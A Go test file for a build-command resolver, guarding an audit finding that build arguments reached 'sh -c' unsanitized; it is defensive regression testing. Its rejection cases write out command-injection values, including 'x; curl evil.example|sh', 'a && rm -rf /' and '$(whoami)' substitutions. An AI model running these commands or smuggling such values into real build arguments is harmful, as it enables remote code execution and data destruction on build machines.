package main

import (
	"strings"
	"testing"
)

// Guards the 2026-07-28 audit finding: build args are spliced verbatim into a
// string that ExecManager runs through `sh -c`, so a metacharacter in an arg is
// arbitrary command execution on the box.
//
// The sanitizer existed, but only inside resolveNativeBuildCommand — covering
// two native platforms and leaving every other platform in resolveBuildCommand's
// switch splicing raw. And it signalled refusal with ok=false, the same value
// that means "not a native platform", so a rejected arg FELL THROUGH into the
// unsanitized general path instead of stopping the build.
//
// To see these fail, delete the validateBuildArgs call at the top of
// resolveBuildCommand (builds.go).

func TestValidateBuildArgs_RejectsShellMetacharacters(t *testing.T) {
	bad := []string{
		"x; curl evil.example|sh",
		"$(id)",
		"`id`",
		"a && rm -rf /",
		"a | tee /tmp/x",
		"a > /tmp/x",
		"a\nid",
		"--flavor=$(whoami)",
		"*",
	}
	for _, arg := range bad {
		t.Run(arg, func(t *testing.T) {
			if err := validateBuildArgs([]string{arg}); err == nil {
				t.Fatalf("validateBuildArgs accepted %q — this reaches `sh -c`", arg)
			}
		})
	}
}

func TestValidateBuildArgs_AcceptsRealBuildArgs(t *testing.T) {
	good := []string{
		"assembleRelease",
		"bundleRelease",
		"--flavor=prod",
		"-PsomeProp=1",
		"--dart-define=API=https://api.example.com",
		"clean",
	}
	if err := validateBuildArgs(good); err != nil {
		t.Fatalf("validateBuildArgs rejected legitimate args: %v", err)
	}
}

// The regression that actually shipped: a NON-native platform never saw the
// sanitizer at all. gradle-aab goes through resolveBuildCommand's general
// switch, which joined args straight into the command string.
func TestResolveBuildCommand_NonNativePlatformRefusesInjection(t *testing.T) {
	inject := "assembleRelease; curl evil.example|sh"

	cmd, _ := resolveBuildCommand(PlatformGradleAAB, t.TempDir(), []string{inject})
	if cmd != "" {
		t.Fatalf("injected arg produced a runnable command for a non-native platform:\n  %s", cmd)
	}
	if strings.Contains(cmd, "curl") {
		t.Fatalf("payload survived into the command string: %s", cmd)
	}
}

// A refused arg must not silently degrade into a different, unsanitized code
// path — the original bug's shape. Native platform + bad arg must yield no
// command, not a fallthrough result.
func TestResolveBuildCommand_NativePlatformRefusalDoesNotFallThrough(t *testing.T) {
	cmd, _ := resolveBuildCommand(PlatformXcodeDeviceInstall, t.TempDir(), []string{"$(id)"})
	if cmd != "" {
		t.Fatalf("native refusal fell through to an unsanitized resolver: %s", cmd)
	}
}

// Legitimate args must still resolve to a real command — the guard has to be
// narrow enough to leave normal builds working.
func TestResolveBuildCommand_LegitimateArgsStillBuild(t *testing.T) {
	cmd, _ := resolveBuildCommand(PlatformGradleAAB, t.TempDir(), []string{"--stacktrace"})
	if cmd == "" {
		t.Fatal("legitimate build args produced no command — guard is too broad")
	}
	if !strings.Contains(cmd, "--stacktrace") {
		t.Fatalf("legitimate arg was dropped from the command: %s", cmd)
	}
}
